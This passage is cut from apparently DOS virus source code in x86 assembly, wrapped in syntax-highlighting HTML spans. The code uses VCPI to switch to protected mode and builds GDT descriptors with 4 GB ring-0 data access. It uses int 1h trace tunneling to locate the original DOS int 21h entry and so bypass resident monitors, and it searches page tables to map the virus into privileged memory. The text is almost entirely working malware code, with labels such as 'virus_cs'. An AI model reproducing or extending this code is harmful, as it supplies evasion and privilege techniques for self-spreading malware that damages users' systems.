        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">pm_ep</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; EBX = protected mode EP in code seg.</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; 4GB, all addressable memory</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; BX in [0..3FFh]</span><span class="sc0">
</span><span class="sc5">l_entry</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; Map the memory in the page table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Read page table entry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Invalid (available) entry?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_page_entry</span><span class="sc0"> </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Page entry</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">         </span><span class="sc1">; Page frame address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">          </span><span class="sc1">; Dirty, Accessed, User, Write, Present</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Store page in page table</span><span class="sc0">
</span><span class="sc5">next_page_entry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Next entry</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">   </span><span class="sc1">; Map page_1 in page table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">          </span><span class="sc1">; Dirty, Accessed, User, Write, Present</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">         </span><span class="sc1">; Calculate page number in page table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Store page in page table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">virus_cs</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_system_regs</span><span class="sc0">
                </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">IDT</span><span class="sc0">
                </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">GDT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">        </span><span class="sc1">; GDT (addr.dir.page table + 100h)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Segment Base (CS)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">CODE_SEL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">              </span><span class="sc1">; Segment Limit (64K)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000000010011010b</span><span class="sc0">    </span><span class="sc1">; Access rights: Executable</span><span class="sc0">
                                                </span><span class="sc1">;  code, readable, present,</span><span class="sc0">
                                                </span><span class="sc1">;  DPL 0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATACS_SEL</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Limit (64K)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000000010010010b</span><span class="sc0">    </span><span class="sc1">; Access rights: Data, writable,</span><span class="sc0">
                                                </span><span class="sc1">;  present, DPL 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ALLMEM_SEL</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">          </span><span class="sc1">; Limit (4GB: granularity on)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1000000010010010b</span><span class="sc0">    </span><span class="sc1">; Access rights: Data, writeble,</span><span class="sc0">
                                                </span><span class="sc1">;  present, granularity, DPL 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">TSS_SEL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Addr. directory page table</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; TSS in dir.page table + 10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000000010001001b</span><span class="sc0">    </span><span class="sc1">; Access rights: System, DPL 0,</span><span class="sc0">
                                                </span><span class="sc1">;  available 386 TSS, present</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">                 </span><span class="sc1">; Limit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_descriptor</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; Addr. directory page table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                </span><span class="sc1">; GDT in dir.page table + 100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">base_gdt</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE0Ch</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">system_registers</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">67h</span><span class="sc0">     </span><span class="sc1">; VCPI - Switch to protected mode</span><span class="sc0">
                </span><span class="sc1">; ESI = linear address in first megabyte of</span><span class="sc0">
                                </span><span class="sc1">;       values for system registers</span><span class="sc0">
                </span><span class="sc1">; Return: interrupts disabled</span><span class="sc0">
                </span><span class="sc1">;         GDTR, IDTR, LDTR, TR loaded</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">


</span><span class="sc5">ofs_i1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">save_ss</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">save_sp</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">int_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get return address from stack</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">     </span><span class="sc1">; NOP+NOP? (int 21h entry point)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_i21_entry</span><span class="sc0">         </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">tunnel_i21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Get int 1h vector (trace)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_i1</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_i1</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Set new int 1h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">save_ss</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">   </span><span class="sc1">; Save stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">save_sp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Read flags</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Set bit trace on</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; DS := 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; Get DOS version</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                    </span><span class="sc1">; Activate int 1h tunneler</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; DS := 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">ofs_i21</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_i1</span><span class="sc0">

</span><span class="sc5">found_i21_entry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_ss</span><span class="sc0">   </span><span class="sc1">; Restore stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Store int 21h entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i21</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_i21</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">restore_i1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES := 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">ofs_i1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; Restore int 1h</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc1">; PM Entry point</span><span class="sc0">
</span><span class="sc5">pm_entry_point</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATACS_SEL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Stack descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">_stack</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Extra data descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ALLMEM_SEL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Data descriptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">GDT_base</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">GDT_limit</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; First entry unused</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Number of entries in GDT</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">l_next_gdt_entry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; Next descriptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">00001000b</span><span class="sc0">            </span><span class="sc1">; Next selector</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Available entry?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_gdt_entry</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">virus_selector</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0FFFh</span><span class="sc0">               </span><span class="sc1">; Limit 4K</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000000010011011b</span><span class="sc0">    </span><span class="sc1">; Access rights: Code, Readable,</span><span class="sc0">
                                                </span><span class="sc1">;  present, accessed, DPL 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_descriptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; Next descriptor</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">          </span><span class="sc1">; Limit (4GB : granurality on)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1000000010010010b</span><span class="sc0">    </span><span class="sc1">; Access rights: Data, Writable,</span><span class="sc0">
                                                </span><span class="sc1">;  present, DPL 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_descriptor</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_pagetable</span><span class="sc0">

</span><span class="sc5">next_gdt_entry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_next_gdt_entry</span><span class="sc0">
</span><span class="sc5">no_descriptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_descriptor</span><span class="sc0">   </span><span class="sc1">; Descriptor not found in GDT</span><span class="sc0">

</span><span class="sc5">search_pagetable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">           </span><span class="sc1">; 1MB</span><span class="sc0">
</span><span class="sc5">l_search_pagetable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">              </span><span class="sc1">; 4KB (a page)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">67h</span><span class="sc0">     </span><span class="sc1">; Page for address 0 ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l_search_pagetable</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1067h</span><span class="sc0"> </span><span class="sc1">; Page for address 4096 ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l_search_pagetable</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">pagetable</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get int 21h vector</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
